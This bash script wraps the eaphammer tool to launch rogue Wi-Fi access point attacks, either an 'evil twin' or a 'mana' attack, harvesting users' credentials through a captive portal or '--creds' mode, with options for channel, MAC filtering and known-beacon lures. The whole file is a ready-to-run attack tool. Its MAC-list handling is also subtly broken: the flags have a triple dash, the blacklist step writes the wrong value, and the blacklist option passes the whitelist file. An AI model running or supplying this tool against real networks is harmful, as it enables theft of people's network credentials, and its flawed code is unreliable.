#!/bin/bash

INTERFACE=""
ESSID=""
BSSID=""
AUTH=""
WPA_VERSION=""
KNOWN_BEACONS=""
MAC_WHITELIST=""
MAC_BLACKLIST=""
OPTION=""
LOUD=""
CHANNEL=""

while getopts "i:e:b:a:w:k:p:v:o:c:l" opt; do
  case "$opt" in
    i)  INTERFACE=$OPTARG;;
    e)  ESSID=$OPTARG;;
    b)  BSSID=$OPTARG;;
    a)  AUTH=$OPTARG;;
    w)  WPA_VERSION=$OPTARG;;
    k)  KNOWN_BEACONS=$OPTARG;;
    p)  MAC_WHITELIST=$OPTARG;;
    v)  MAC_BLACKLIST=$OPTARG;;
    o)  OPTION=$OPTARG;;
    c)  CHANNEL=$OPTARG;;
    l)  LOUD="1";; #Used to no broadcast deauthentication packets, only useful with mdk4
    esac
done


evil_twin(){
    # REQUREMENTS: INTERFACE, ESSID and AUTH
    CMD="eaphammer -i $INTERFACE --essid $ESSID --auth $AUTH"
    if [ "$AUTH" = "open" ]; then
        CMD="$CMD --captive-portal"
    elif [ "$AUTH" = "wpa-psk" ] || [ "$AUTH" = "wpa-eap" ]; then
        if [ "$WPA_VERSION" ]; then
            CMD="$CMD --wpa-version $WPA_VERSION --creds"
        fi
    else
        CMD="$CMD --creds"
    fi

    if [ "$CHANNEL" ]; then
        CMD="$CMD --channel $CHANNEL"
    fi
    
    if [ "$MAC_WHITELIST" ]; then
        TEMPFILEWHITE="/tmp/white$RANDOM"
        echo "$MAC_WHITELIST" | sed "s/,/\n/g" > $TEMPFILEWHITE
        CMD="$CMD ---mac-whitelist $TEMPFILEWHITE"
    fi

    if [ "$MAC_BLACKLIST" ]; then
        TEMPFILEBLACK="/tmp/black$RANDOM"
        echo "$TEMPFILEBLACK" | sed "s/,/\n/g" > $TEMPFILEBLACK
        CMD="$CMD ---mac-blacklist $TEMPFILEWHITE"
    fi

    echo "Going to execute $CMD"
    $CMD
}

mana(){
    # REQUREMENTS: INTERFACE, ESSID and AUTH
    CMD="eaphammer -i $INTERFACE --auth $AUTH --cloaking full --mana"
    if [ "$AUTH" = "open" ]; then
        CMD="$CMD --captive-portal"
    else
        CMD="$CMD --creds"
    fi

    if [ "$LOUD" ]; then
        CMD="$CMD --loud"
    fi

    if [ "$MAC_WHITELIST" ]; then
        TEMPFILEWHITE="/tmp/white$RANDOM"
        echo "$MAC_WHITELIST" | sed "s/,/\n/g" > $TEMPFILEWHITE
        CMD="$CMD ---mac-whitelist $TEMPFILEWHITE"
    fi

    if [ "$MAC_BLACKLIST" ]; then
        TEMPFILEBLACK="/tmp/black$RANDOM"
        echo "$TEMPFILEBLACK" | sed "s/,/\n/g" > $TEMPFILEBLACK
        CMD="$CMD ---mac-blacklist $TEMPFILEWHITE"
    fi

    if [ "$KNOWN_BEACONS" ]; then
        TEMPFILE="/tmp/beacons$RANDOM"
        echo "$KNOWN_BEACONS" | sed "s/,/\n/g" > $TEMPFILE
        CMD="$CMD --known-beacons --known-ssids-file $TEMPFILE"
    fi

    echo "Going to execute $CMD"
    $CMD
}




if [ "$OPTION" == "evil_twin" ]; then
    evil_twin
elif [ "$OPTION" == "mana" ]; then
    mana
fi